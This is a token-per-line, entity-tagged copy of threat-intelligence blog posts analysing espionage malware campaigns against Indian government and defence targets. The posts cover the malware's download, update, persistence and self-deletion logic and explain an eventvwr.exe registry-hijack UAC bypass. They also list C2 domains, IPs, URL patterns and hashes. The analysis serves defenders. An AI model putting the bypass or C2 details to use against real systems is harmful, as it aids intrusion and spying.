instead
of
extracting
the
URL
from
the
C2
response
and
downloading
the
executable
,
it
gets
executable
content
from
the
networks
stream
from
a
hard
coded
IP
address
and
then
writes
it
to
the
disk
and
executes
it
.

This
functionality
is
triggered
by
making
a
request
to
either
JobTcp1.php
or
JobTcp2.php
,
if
the
C2
response
satisfies
the
condition
then
it
gets
the
executable
content
from
a
hard
coded
IP
address
.

After
understanding
the
logic
&
to
satisfy
the
condition
the
environment
was
configured
to
give
proper
response
when
the
malware
made
a
request
to
JobTcp1.php
or
JobTcp2.php
.

Below
screen
shot
shows
the
response
given
to
the
malware
.

19/33

Malware
then
reads
the
c2
response
and
from
the
C2
response
it
extracts
two
things
a
)
filename
and
b
)
the
command
string
that
will
trigger
the
download
functionality
.

From
the
C2
response
the
filename
is
extracted
starting
from
offset
14
(
i.e
15th
character
)
and
it
determines
the
length
of
the
string
to
extract
by
finding
the
start
offset
of
the
string
'
clientpermission
'
once
it
finds
it
,
its
offset
value
is
subtracted
with
17
.

The
command
string
to
trigger
the
download
functionality
is
extracted
from
the
C2
response
using
the
logic
shown
below
.

Below
screen
shot
shows
the
logic
used
to
extract
the
filename
and
the
command
string
,
in
the
below
screen
shot
the
extracted
command
string
is
stored
in
the
variable
ServerTask1Permission
.

Once
the
filename
and
command
string
is
extracted
,
the
malware
compares
the
command
string
with
the
string
'
Pending
'
,
if
the
command
string
matches
with
string
'
Pending
'
then
the
extracted
filename
(
in
this
case
the
extracted
filename
is
'
testfile
'
)
from
the
C2
response
is
concatenated
with
'
.exe
'
as
shown
below
.

20/33

It
then
connects
to
the
hard
coded
IP
91[.]205[.]173[.]3  B_ip.cncsvr
on
port
6134
,
and
it
sends
the
concatenated
filename
(
testfile.exe
)
as
shown
below
.

The
IP
address
after
verifying
the
filename
then
returns
the
executable
content
which
malware
reads
directly
from
the
network
stream
and
writes
to
the
disk
in
the
%Appdata%\SQLIte
directory
as
shown
below
.

21/33

The
dropped
file
is
then
executed
as
shown
in
the
below
screen
shot
.

c
)
Update
Functionality

Malware
has
the
capability
to
update
itself
this
is
done
by
making
a
request
to
updateproductdownload.php
,
if
C2
response
satisfies
the
condition
then
it
downloads
the
updated
executable
from
an
URL
.

After
understanding
the
logic
&
to
satisfy
the
condition
the
environment
was
configured
to
give
proper
response
.

Below
screen
shot
shows
the
response
given
to
the
malware
when
it
makes
a
request
to
updateproductdownload.php
22/33

Malware
then
reads
the
c2
response
and
from
the
C2
response
it
extracts
two
things
a
)
URL
to
download
the
updated
executable
and
b
)
the
command
string
that
will
trigger
the
update
functionality

From
the
C2
response
the
URL
is
extracted
by
finding
the
start
offset
of
the
string
'
updatetpermission
'
once
it
finds
it
,
its
offset
value
is
subtracted
with
17
to
get
the
URL
from
where
the
updated
executable
will
be
downloaded
.

To
get
the
command
string
malware
extracts
the
string
starting
from
the
offset
of
the
string
'
updatetpermission
'
+
19
and
extracts
a
7
character
length
string
which
it
uses
as
the
command
string
.

Below
screen
shot
shows
the
logic
used
to
extract
the
URL
and
the
command
string
,
in
the
below
screen
shot
the
extracted
command
string
is
stored
in
the
variable
ServerUpdatePermissionInstruction
.

Once
the
URL
and
command
string
is
extracted
,
the
malware
compares
the
command
string
with
the
string
'
Pending
'
,
only
if
the
command
string
matches
with
string
'
Pending
'
then
the
malware
downloads
the
updated
executable
from
the
extracted
URL
.

Below
screen
shot
shows
the
code
which
performs
the
check
and
and
extracted

Note
:
In
the
below
screen
shot
the
URL
(
hxxp://c2xyup.com/update.exe  B_url.unknown
)
is
not
the
actual
URL
used
by
the
malware
for
updating
,
this
is
a
test
URL
used
to
determine
the
functionality
,
so
this
URL
should
not
used
as
an
indicator
.

23/33

The
malware
then
downloads
the
updated
executable
and
drops
it
in
the
%Appdata%\SQLite
directory
as
shown
in
the
below
screen
shots
.

Once
it
downloads
the
updated
executable
then
the
malware
creates
a
value
in
the
Run
registry
key
for
persistence
,
before
that
it
deletes
the
old
entry
and
adds
the
new
entry
so
that
next
time
when
the
system
starts
the
updated
executable
will
run
.

Below
screen
shots
show
the
registry
entry
added
by
the
malware
.

24/33

The
functionality
allows
the
attacker
to
update
their
malware
components
.

d
)
Delete
/
Uninstall
Functionality

Malware
also
has
the
capability
to
delete
itself
this
is
done
by
making
a
request
to
Uninstaller.php
.

Below
screen
shot
shows
the
code
that
makes
this
request
.

25/33

The
environment
was
configured
to
give
a
proper
response
to
trigger
the
uninstall
/
delete
functionality
.

Below
screen
shot
shows
the
network
traffic
making
the
POST
request
to
Uninstaller.php
and
the
returned
response
.

Malware
then
checks
if
the
C2
response
contains
the
string
'
delete
'
.

Below
screen
shots
show
the
code
that
reads
the
C2
response
and
the
code
that
performs
the
check
.

26/33

If
the
C2
response
contains
the
string
'
delete
'
,
then
the
malware
first
deletes
the
entry
from
the
Run
registry
that
the
malware
uses
for
persistence
as
shown
below
.

After
deleting
the
registry
entry
,
malware
deletes
all
the
files
from
the
%Appdata%\SQLite
directory
by
creating
a
batch
script
.

The
batch
script
pings
a
hard
coded
IP
address
180[.]92[.]154[.]176  B_ip.cncsvr
10
times
(
this
is
a
technique
used
to
sleep
for
10
seconds
)
before
deleting
all
the
files
.

27/33

Once
the
all
the
files
are
deleted
the
malware
kills
its
own
process
as
shown
in
the
below
screen
shot
.

This
functionality
allows
the
attackers
to
delete
their
footprints
on
the
system
.

C2
Information

This
section
contains
the
details
of
the
C2
domain
qhavcloud[.]com B_url.cncsvr
.

This
C2
domain
was
associated
with
two
IP
addresses
.

Both
of
these
IP
addresses
is
associated
with
hosting
provider
in
Germany
as
shown
in
the
screen
shots
below
.

28/33

The
hard
coded
IP
address
91[.]205[.]173[.]3  B_ip.cncsvr
in
the
binary
from
where
the
malware
downloads
additional
components
is
also
associated
with
the
same
hosting
provider
in
Germany
as
shown
below
.

The
C2
domain
qhavcloud[.]com B_url.cncsvr
was
also
found
to
be
associated
with
multiple
malware
samples
in
the
past
.

Below
screen
shot
shows
the
md5
hashes
of
the
samples
that
is
associated
with
the
C2
domain
.

29/33

The
C2
domain
qhavcloud[.]com B_url.cncsvr
and
the
hard
coded
IP
address
91[.]205[.]173[.]3  B_ip.cncsvr
were
also
found
to
be
associated
with
another
attack
campaign
which
targeted
the
senior
army
officers
.

This
suggests
that
the
same
espionage
group
involved
in
this
attack
also
targeted
the
senior
army
officers
using
a
different
email
theme
.

Threat
Intelligence

Investigating
the
domain
idsadesk[.]in B_url.unknown
(
which
was
used
to
send
the
email
by
impersonating
the
identity
of
IDSA
)
shows
that
it
was
created
on
20th
Feb
2017
(
which
is
the
day
before
the
spear-phishing  B_malware.infosteal
email
was
sent
to
the
victims
)
.

Most
of
the
registrant
information
seems
to
be
fake
and
another
notable
detail
that
is
of
interest
is
the
registrant
country
and
country
code
(
+92
)
of
registrant
phone
number
is
associated
with
Pakistan
.

30/33

Further
investigation
shows
that
the
same
registrant
email
id
was
also
used
to
register
another
similar
domain
(
idsagroup[.]in  B_url.unknown
)
which
also
impersonates
the
identity
of
IDSA
.

This
impersonating
domain
was
also
registered
on
the
same
day
20th
February
2017
and
this
domain
could
also
be
used
by
the
attackers
to
send
out
spear-phishing  B_malware.infosteal
emails
to
different
targets
.

While
investigating
the
malware's
uninstall
/
delete
functionality
it
was
determined
that
malware
creates
a
batch
script
to
delete
all
its
files
but
before
deleting
all
the
files
it
pings
10
times
to
an
hard
coded
IP
address
180[.]92[.]154[.]176  B_ip.cncsvr
as
shown
below
.

31/33

Investigating
this
hard
coded
IP
address
shows
that
it
is
located
in
Pakistan
.

The
Pakistan
connection
in
the
whois
information
and
the
hard
coded
IP
address
is
interesting
because
the
previous
two
attacks
against
Indian
Ministry
of
External
Affairs
and
Indian
Navy's
submarine
manufacturer
also
had
a
Pakistan
connection
.

Based
on
just
the
whois
information
(
which
can
be
faked
)
and
the
location
of
the
IP
address
it
is
hard
to
say
if
the
Pakistan
espionage
group
is
involved
in
this
attack
,
but
based
on
the
email
theme
,
tactics
used
to
impersonate
Indian
think
tank
(
IDSA
)
and
the
targets
chosen
that
possibility
is
highly
likely
.

Below
screen
shot
shows
the
location
of
the
hard
coded
IP
address
.

Indicators
Of
Compromise
(
IOC
)

In
this
campaign
the
cyber
espionage
group
targeted
Central
Bureau
of
Investigation
(
CBI
)
but
it
is
possible
that
other
government
entities
could
also
be
targeted
as
part
of
this
attack
campaign
.

The
indicators
associated
with
this
attack
are
provided
so
that
the
organizations
(
Government
,
Public
,
Private
organizations
and
Defense
sectors
)
can
use
these
indicators
to
detect
,
remediate
and
investigate
this
attack
campaign
.

Below
are
the
indicators

Dropped
Malware
Sample
:
f8daa49c489f606c87d39a88ab76a1ba  B_hash

Related
Malware
Samples
:
15588a9ba1c0abefd38ac2594ee5be53  B_hash
04b4b036a48dc2d2022cc7704f85a560  B_hash
becc8e77ef003a4c88f7e6348ffd3609  B_hash
ceeeacbaf38792bcf06022e2b4874782  B_hash
515dce0ede42052ff3ef664db9873cea  B_hash
50c1d394bfa187ffd6251df6dd14e939  B_hash
3bd16cc1d1fea7190c36b3bd10c6810d  B_hash
b6c861556412a15b7979459176b7d82f  B_hash

Network
Indicators
Associated
with
C2
:
qhavcloud[.]com B_url.cncsvr
173[.]212[.]194[.]214 B_ip.cncsvr
173[.]212[.]193[.]53  B_ip.cncsvr
91[.]205[.]173[.]3  B_ip.cncsvr
180[.]92[.]154[.]176  B_ip.cncsvr

Domains
Impersonating
the
Identity
of
Indian
Think
Tank
(
IDSA
)
:
32/33
idsadesk[.]in B_url.unknown
idsagroup[.]in  B_url.unknown

Email
Indicator
:
iasia69@z7az14m[.]com B_url.unknown

C2
Communication
Patterns
:
hxxp://qhavcloud[.]com//northernlights//PingPong.php  B_url.cncsvr
hxxp://qhavcloud[.]com//northernlights//postdata.php  B_url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobProcesses.php  B_url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobWork1.php  B_url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobWork2.php  B_url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobTCP1.php B_url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobTCP2.php B_url.cncsvr
hxxp://qhavcloud[.]com//northernlights//updateproductdownload.php B_url.cncsvr
hxxp://qhavcloud[.]com//northernlights//Uninstaller.php B_url.cncsvr

Conclusion

Attackers
in
this
case
made
every
attempt
to
launch
a
clever
attack
campaign
by
impersonating
the
identity
of
highly
influential
Indian
Think
tank
to
target
Indian
investigative
agency
and
the
officials
of
the
Indian
army
by
using
an
email
theme
relevant
to
the
targets
.

The
following
factors
in
this
cyber
attack
suggests
the
possible
involvement
of
Pakistan
state
sponsored
cyber
espionage
group
to
spy
or
to
take
control
of
the
systems
of
the
officials
of
Central
Bureau
of
Investigation
(
CBI
)
and
officials
of
the
Indian
Army
.

Use
of
domain
impersonating
the
identity
of
highly
influential
Indian
think
tank

Victims
/
targets
chosen
(
CBI
and
Army
officials
)

Use
of
Email
theme
that
is
of
interest
to
the
targets

Location
of
one
of
the
hard
coded
IP
address
in
the
binary

Use
of
TTP's
(
tactics
,
techniques
&
procedures
)
similar
to
the
previous
campaigns
targeting
Indian
Ministry
of
External
Affairs
and
Indian
Navy's
Warship
Manufacturer
.

Use
of
the
same
C2
infrastructure
that
was
used
to
target
senior
army
officers

The
attackers
in
this
case
used
multiple
techniques
to
avoid
detection
and
to
frustrate
analysts
.

The
following
factors
reveal
the
attackers
intention
to
remain
stealthy
and
to
gain
long-term
access
by
evading
analysis
and
security
monitoring
at
both
the
desktop
and
network
levels
.

Use
of
password
protected
macro
to
prevent
viewing
the
code
and
to
make
manual
analysis
harder

Use
of
TextBox
within
the
UserForm
to
store
malicious
content
to
bypass
analysis
tools

Use
of
legitimate
service
like
Google
drive
to
store
the
list
of
back
up
C2
servers
to
bypass
security
monitoring
and
reputation
based
devices
.

Use
of
malware
that
performs
various
checks
before
performing
any
malicious
activity

Use
of
backup
C2
servers
and
hosting
sites
to
keep
the
operation
up
and
running

Use
of
hosting
provider
to
host
C2
infrastructure
33/33
Cyber
Attack
Targeting
Indian
Navy's
Submarine
and
Warship

Manufacturer
cysinfo.com/cyber-attack-targeting-indian-navys-submarine-warship-manufacturer/ B_url.normal
2/10/2017

In
my
previous
blog
posts
I
described
attack
campaigns
targeting
Indian
government
organizations
,
and
Indian
Embassies
and
Ministry
of
External
affairs
.

In
this
blog
post
I
describe
a
new
attack
campaign
where
cyber
espionage
group
targeted
the
users
of
Mazagon
Dock
Shipbuilders
Limited
(
also
called
as
ship
builder
to
the
nation
)
.

Mazagon
Dock
Shipbuilders
Limited
(
MDL
)
is
a
Public
Sector
Undertaking
of
Government
of
India
(
Ministry
of
Defence
)
and
it
specializes
in
manufacturing
warships
and
submarines
for
the
Indian
Navy
.

In
order
to
infect
the
users
associated
with
Mazagon
Dock
Shipbuilders
Limited
(
MDL
)
,
the
attackers
distributed
spear-phishing  B_malware.infosteal
emails
containing
malicious
excel
file
which
when
opened
drops
a
malware
capable
of
spying
on
infected
systems
.

The
email
purported
to
have
been
sent
from
legitimate
email
ids
.

The
attackers
spoofed
the
email
id
associated
with
a
Spain
based
equipment
manufacturing
company
Hidrofersa
which
specializes
in
designing
,
manufacturing
naval
,
industrial
and
mining
machinery
.

Overview
of
the
Malicious
Emails

On
26th
January
,
2017
Indian
Navy
displayed
its
state-of-the-art
stealth
guided
missile
destroyer
INS
Chennai
and
the
indigenously-made
Kalvari
class
Scorpene
submarines
at
the
Republic
Day
parade
showcasing
India's
military
strength
and
achievements
.

INS
Chennai
and
Kalvari
class
submarines
were
manufactured
by
Mazagon
Dock
Shipbuilders
Limited
(
MDL
)
.

On
25th
January
(
day
before
the
Republic
day
)
attackers
spoofed
an
email
id
associated
with
Hidrofersa
a
Spain
based
company
which
specializes
in
designing
,
manufacturing
naval
,
industrial
and
mining
machinery
and
the
email
was
sent
to
the
users
of
Mazagon
Dock
Shipbuilders
Limited
(
MDL
)
.

The
email
attachment
contained
two
malicious
excel
files
(
both
excel
files
turned
out
to
be
same
but
used
different
names
)
.

The
email
was
made
to
look
like
it
was
sent
by
a
General
service
manager
of
Hidrofersa
enquiring
about
the
product
delivery
schedule
.

Below
screen
shot
shows
the
recipients
associated
with
Mazagon
Dock
Shipbuilders
Limited
(
MDL
)
,
this
information
was
determined
from
the
Email
header
.

Mazagon
Dock
Shipbuilders
Limited
(
MDL
)
is
listed
as
one
of
clients
of
Hidrofersa
(
mentioned
in
Hidrofersa
website
)
and
as
per
their
website
Hidrofersa
has
shipped
equipments
to
Mazagon
Dock
Shipbuilders
Limited
(
MDL
)
in
the
past
as
shown
in
the
below
screen
shots
.

This
is
probably
the
reason
attackers
spoofed
the
email
id
of
Hidrofersa
as
it
is
less
likely
to
trigger
any
suspicion
and
there
is
high
chance
of
recipients
opening
the
attachment
as
it
is
coming
from
a
trusted
equipment
manufacturer
(
Hidrofersa
)
.

It
looks
like
attackers
carefully
researched
(
or
they
already
knew
about
)
the
trust
relationship
between
these
two
companies
.

From
the
email
it
looks
like
the
goal
of
the
attackers
was
to
infect
,
take
control
of
the
systems
of
users
associated
with
Mazagon
Dock
Shipbuilders
Limited
(
MDL
)
and
to
steal
sensitive
information
(
like
Product
design
documents
,
blueprints
,
manufacturing
processes
etc
)
related
to
warships
and
submarines
.

Analysis
of
Malicious
Excel
File

When
the
recipient
of
the
email
opens
the
attached
excel
file
it
prompts
the
user
to
enable
macro
content
and
the
excel
also
contains
instruction
on
how
to
enable
the
macros
.


Once
the
the
macro
content
is
enabled
,
it
calls
an
auto
execute
function
Workbook_Open()
which
in
turn
downloads
the
malware
sample
and
executes
on
the
system
.

The
malicious
macro
code
was
reverse
engineered
to
understand
its
capabilities
.

The
macro
code
was
heavily
obfuscated
(
used
obscure
variable
/
function
names
to
make
analysis
harder
)
as
shown
below
.

The
macro
also
contained
lot
of
junk
code
,
unnecessary
comments
and
variable
assignments
as
shown
below
.

The
attackers
used
this
technique
to
delay
,
divert
and
confuse
the
manual
analysis
.

The
macro
then
decodes
a
string
which
runs
PowerShell
script
to
download
malware
from
a
popular
university
site
located
in
Indonesia
as
shown
below
.

The
attackers
probably
compromised
the
university
website
to
host
the
malware
.

The
technique
of
hosting
malicious
code
in
a
university
site
(
legitimate
site
)
has
advantages
and
it
is
unlikely
to
trigger
any
suspicion
in
security
monitoring
and
also
can
bypass
reputation
based
devices
.

The
PowerShell
script
(
shown
below
)
drops
the
downloaded
executable
in
the
%TEMP%
directory
as
'
doc6.exe
'
.
It
then
adds
a
registry
entry
for
the
dropped
executable
and
invokes
eventvwr.exe
,
this
is
an
interesting
registry
hijack
technique
which
allows
the
doc6.exe
to
be
executed
by
eventvwr.exe
with
high
integrity
level
and
also
this
technique
silently
bypasses
the
UAC
(
user
account
control
)
.

This
technique
of
UAC
bypass
is
mentioned
in
the
blog
'
Fileless  B_malware.unknown
'
UAC
Bypass
Using
eventvwr.exe
and
Registry
Hijacking

Normally
when
eventvwr.exe
process
(
which
is
running
as
high
integrity
process
)
is
invoked
,
it
starts
mmc.exe
which
opens
eventvwr.msc
causing
the
Event
Viewer
to
be
displayed
.

To
start
mmc.exe
,
eventvwr.exe
searches
this
registry
key
'
HKCU\Software\Classes\mscfile\shell\open\command
'
looking
for
mmc.exe
before
looking
at
HKCR\mscfile\shell\open\command
.

In
this
case
since
this
registry
'
HKCU\Software\Classes\mscfile\shell\open\command
'
was
hijacked
to
contain
the
entry
for
'
doc6.exe
'
,
this
will
cause
the
eventvwr.exe
process
to
invoke
doc6.exe
with
high
integrity
level
.

Below
screen
shot
shows
doc6.exe
running
from
the
%TEMP%
directory

The
dropped
file
(
doc6.exe
)
was
determined
as
KeyBase B_malware.infosteal
malware I
.

This
malware
can
steal
and
send
sensitive
information
to
the
attackers
like
keystrokes
,
opened
applications
,
web
browsing
history
,
usernames
/
passwords
,
upload
Desktop
screen
shots
etc
.

The
feature
of
uploading
the
Desktop
screen
shot
is
notable
because
if
the
infected
user
opens
a
design
or
design
document
related
to
submarines
or
warships
the
screen
shot
of
that
can
be
sent
to
the
attacker
.

The
attackers
also
hosted
multiple
samples
of
KeyBase B_malware.infosteal
malware I
in
the
compromised
university
website
.

Below
screen
shot
shows
hashes
of
25
samples
hosted
on
the
university
site
.

Analysis
of
the
Dropped
Executable
(
doc6.exe
)

The
dropped
file
was
analyzed
in
an
isolated
environment
(
without
actually
allowing
it
to
connect
to
the
c2
server
)
.

This
section
contains
the
behavioral
analysis
of
the
dropped
executable

Once
the
dropped
file
(
doc6.exe
)
is
executed
the
malware
copies
itself
into
%AllUsersProfile%
directory
as
'
Important.exe
'
,
In
addition
to
that
it
also
drops
two
files
'
Mails.txt
'
and
'
Browsers.txt
'
into
the
same
directory
as
shown
below
.

The
malware
then
creates
a
registry
value
for
the
the
dropped
file
(
Important.exe
)
,
this
ensures
that
malware
is
executed
every
time
the
system
restarts
.

The
malware
after
execution
keeps
track
of
the
user
activity
(
like
applications
opened
,
files
opened
etc
)
but
does
not
immediately
generate
any
network
traffic
,
this
is
to
make
sure
that
no
network
activity
is
generated
during
automated
/
sandbox
analysis
.

After
sleeping
for
a
long
time
malware
makes
an
http
connection
to
the
C2
server
(
command
&
control
server
)
and
sends
the
tracked
user
activity
to
the
attacker
.

The
below
screen
shot
shows
the
communication
to
the
C2
server
on
port
80
.

C2
Communication
Pattern

Once
malware
makes
an
http
connection
after
sleeping
for
a
long
time
,
it
sends
the
system
information
and
the
tracked
activity
to
the
C2
server
as
http
parameters
.

Below
screen
shot
shows
the
network
communication
pattern
where
the
hostname
and
the
machine
time
is
sent
to
C2
server
.

Below
screen
shot
shows
a
network
communication
pattern
where
the
opened
window
title
was
sent
to
the
C2
server
,
this
pattern
below
indicates
that
'
test.txt
'
file
was
opened
with
notepad
on
the
infected
system
.

Below
screen
shot
shows
a
network
communication
pattern
indicating
a
document
named
'
secret.docx
'
was
opened
with
Microsoft
Word
.

Below
screen
shot
shows
a
network
communication
pattern
indicating
Internet
Explorer
was
launched
on
the
infected
system
.

Every
activity
on
the
infected
system
is
sent
to
the
attacker
,
this
allows
the
attacker
to
take
further
action
and
also
since
the
open
window
title
is
sent
to
attacker
,
this
lets
the
attacker
know
about
the
documents
opened
and
the
tools
running
on
the
system
or
if
any
analysis
tools
are
used
to
inspect
the
malware
.

C2
Domain
Information

This
section
contains
the
details
of
the
C2
domain
(
tripleshop[.]id B_url.cncsvr
)
.

All
the
25
samples
hosted
on
compromised
university
site
was
analyzed
and
it
was
determined
that
all
these
samples
also
communicated
to
the
C2
domain
tripleshop[.]id B_url.cncsvr

The
C2
domain
was
associated
with
only
one
IP
address
.

This
IP
address
is
associated
with
hosting
provider
in
Indonesia
as
shown
in
the
screen
shots
below

Below
screen
shot
shows
the
timeline
when
the
IP
address
was
active
.

The
IP
was
first
seen
to
be
active
on
18th
Jan
,
2017
(
one
week
before
the
spear-phishing  B_malware.infosteal
mail
was
sent
to
the
victims
)
.

Threat
Intelligence

Even
though
attackers
tried
to
make
it
look
like
the
spear B_malware.infosteal
phishing  I
email
was
sent
by
an
email
id
associated
with
Hidrofersa
but
inspecting
the
email
headers
revealed
some
interesting
information
.

The
X-AuthUser
in
the
header
below
revealed
the
identity
of
the
sender
.

The
sender
is
associated
with
a
company
named
'
Combined
Freight
(
PVT
)
Limited
'
(
combinedfreight[.]com B_url.unknown
)

Combined
Freight
(
PVT
)
Limited
is
freight
forwarding
company
which
is
into
ocean
&
air
freight
business
headquartered
in
Karachi
,
Pakistan
(
as
per
their
website
)
.

This
company
has
4
other
offices
in
Pakistan
(
Lahore
,
Islamabad
,
Sialkot
,
Faisalabad
)
.

Below
is
the
screen
shot
taken
from
their
website
.

Based
on
the
information
mentioned
above
,
It
looks
like
the
spoofed
email
was
sent
by
a
user
associated
with
a
Pakistan
based
company
Combined
Freight
(
PVT
)
Limited
.

Indicators
Of
Compromise

In
this
case
the
cyber
espionage
group
targeted
Mazagon
Dock
Shipbuilders
Limited
(
MDL
)
but
it
is
possible
that
other
defense
equipment
manufacturers
could
also
be
targeted
as
part
of
this
attack
campaign
.

The
indicators
associated
with
this
attack
are
provided
so
that
the
organizations
(
Government
,
Public
,
Private
organizations
,
Defense
and
Defense
equipment
manufacturers
)
can
use
these
indicators
to
detect
,
remediate
and
investigate
this
attack
campaign
.

Below
are
the
indicators

Dropped
Malware
Sample
:
08f2fc9cb30b22c765a0ca9433b35a46  B_hash

Samples
hosted
on
the
compromised
University
site
:
6c94b4c7610d278bf8dfc3dbb5ece9ce  B_hash
a81eaed8ae25f5fa5b107cbc6fe6e446  B_hash
9a708879fd0a03d4089ee343c9254e5b  B_hash
069629248742f9d762f66568ba7bcec8  B_hash
6455a43366f4da09429738076e7f289c  B_hash
34d5a3d6ae3c1836e0577b6f94ee0294  B_hash
6eee8a69bc40b104931abdd68509df85  B_hash
01c85dd7d8202765331a5cc818948213  B_hash
42664aa65c473832a5c0df62c8b38d68  B_hash
18e7480894149194f2cd17ee40d0ad7b  B_hash
575b4b449a12f2bed583f2a59485f776  B_hash
eae013aec7f45661223ea115ee38cc95  B_hash
33b9c2c2cbecd4a4844057491b02379e  B_hash
bf499821c935e67e0fb606915453a964  B_hash
42e411bcb48240fb44c48327b81d8c57  B_hash
efaa8d161bbe6342204ffa5b1b22ed0c  B_hash
4623d0e188dc225de8dcd494c7802f7f  B_hash
3cba51905a78bd221a2433ee180111c0  B_hash
a6e6a131887c0cdbf67569e1320840d8  B_hash
08f2fc9cb30b22c765a0ca9433b35a46  B_hash
44b7aaea854a1a3a0addb521eb7c5eb9  B_hash
22730ae47acc178c0445c486d16d7ae9  B_hash
5b5edc209737b6faa3a6d6711fba1648  B_hash
bf5e7ea70c2dab12100b91d77ca76ff2  B_hash
34c44c9138a2d4c31391c2cc0b044c02  B_hash

Network
Indicators
Associated
with
C2
:
tripleshop[.]id B_url.cncsvr
103[.]229[.]74[.]32 B_ip.cncsvr

C2
Communication
Patterns
:
hxxp://tripleshop[.]id/userfiles/media/pixum/okilo/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/agogo/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/alpha/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/ariri/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/bobby/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/chisom/post.php  B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/crack/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/declan/post.php  B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/elber/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/figure/post.php  B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/henry/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/ike/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/jizzy/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/kcc/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/kc/post.php  B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/matte/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/nels/post.php  B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/notes/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/polish/post.php  B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/turbo/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/whesilo/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/yboss/post.php B_url.cncsvr
hxxp://tripleshop[.]id/userfiles/media/pixum/yg/post.php  B_url.cncsvr

Conclusion

Attackers
in
this
case
made
every
attempt
to
launch
a
clever
attack
campaign
by
spoofing
legitimate
email
ids
and
using
an
email
theme
relevant
to
the
targets
.

The
following
factors
in
this
cyber
attack
suggests
the
possible
involvement
of
Pakistan
state
sponsored
cyber
espionage
group
to
steal
the
intellectual
property
such
as
design
/
blueprints
and
manufacturing
data
related
to
submarines
and
warships
.

Victims
/
targets
chosen
(
Submarine
&
Warship
manufacturer
for
Indian
Navy
)

Use
of
Email
theme
related
to
the
targets

Timing
of
the
spear B_malware.infosteal
phishing  I
emails
sent
to
the
victims
(
The
day
before
the
Republic
Day
)

Email
header
information
indicating
the
possible
Pakistan
connection

Use
of
malware
that
is
capable
of
spying
and
uploading
screen
shots

Use
of
TTP's
(
tactics
,
techniques
&
procedures
)
similar
to
the
previous
campaign

The
following
factors
reveal
the
attackers
intention
to
remain
stealthy
and
the
attempt
to
evade
sandbox
analysis
,
manual
analysis
and
security
monitoring
at
both
the
desktop
and
network
levels
.

Use
of
obfuscated
malicious
macro
code

Use
of
junk
code
(
to
divert
the
manual
analysis
)

Use
of
compromised
university
site
to
host
malicious
code
(
to
bypass
security
monitoring
)

Use
of
Silent
UAC
(
user
account
control
)
bypass
technique

Use
of
Malware
that
sleeps
for
long
time
without
generating
any
network
activity
(
to
evade
sandbox
analysis
)

Use
of
hosting
provider
to
host
C2
infrastructure

Cyber
espionage
groups
will
continue
targeting
defense
sectors
and
defense
equipment
manufacturers
for
the
following
reasons
:

To
steal
defense
related
information
and
proprietary
product
information
that
can
provide
their
sponsoring
governments
with
military
and
economic
advantages
.

To
identify
vulnerabilities
in
the
defense
technologies
to
gain
advantage
over
adversary's
military
capabilities

To
reduce
their
research
and
development
costs
and
produce
and
sell
similar
products
at
lower
prices

References
http://researchcenter.paloaltonetworks.com/2015/06/keybase-keylogger-malware-family-exposed/  B_url.normal
http://www.brycampbell.co.uk/new-blog/2015/7/14/keybase-malware B_url.normal
http://researchcenter.paloaltonetworks.com/2016/02/keybase-threat-grows-despite-public-takedown-a-picture-isworth-a-thousand-words/ B_url.normal
https://www.fireeye.com/current-threats/reports-by-industry/aerospace-threat-intelligence.html  B_url.normal

Follow
us
on
Twitter
:
@monnappa22
@cysinfo22
Uri
Terror
attack
&
Kashmir
Protest
Themed
spear B_malware.infosteal
phishing  I
emails
targeting
Indian
Embassies
and
Indian
Ministry
of
external
affairs
cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/  B_url.normal
1/19/2017

In
my
previous
blog
I
posted
details
of
a
cyber
attack
targeting
Indian
government
organizations
.

This
blog
post
describes
another
attack
campaign
where
attackers
used
the
Uri
terror
attack
and
Kashmir
protest
themed
spear B_malware.infosteal
phishing  I
emails
to
target
officials
in
the
Indian
Embassies
and
Indian
Ministry
of
External
Affairs
(
MEA
)
.

In
order
to
infect
the
victims
,
the
attackers
distributed
spear-phishing  B_malware.infosteal
emails
containing
malicious
word
document
which
dropped
a
malware
capable
of
spying
on
infected
systems
.

The
email
purported
to
have
been
sent
from
legitimate
email
ids
.

The
attackers
spoofed
the
email
ids
associated
with
Indian
Ministry
of
Home
Affairs
to
send
out
email
to
the
victims
.

Attackers
also
used
the
name
of
the
top-ranking
official
associated
with
Minister
of
Home
affairs
in
the
signature
of
the
email
,
this
is
to
make
it
look
like
the
email
was
sent
by
a
high-ranking
Government
official
associated
with
Ministry
of
Home
Affairs
(
MHA
)
.

Overview
of
the
Malicious
Emails

In
the
The
first
wave
of
attack
,
The
attackers
spoofed
an
email
id
that
is
associated
with
Indian
Ministry
of
Home
Affairs
(
MHA
)
and
an
email
was
sent
on
September
20th
,
2016
(
just
2
days
after
the
Uri
terror
attack
)
to
an
email
id
associated
with
the
Indian
Embassy
in
Japan
.

The
email
was
made
to
look
like
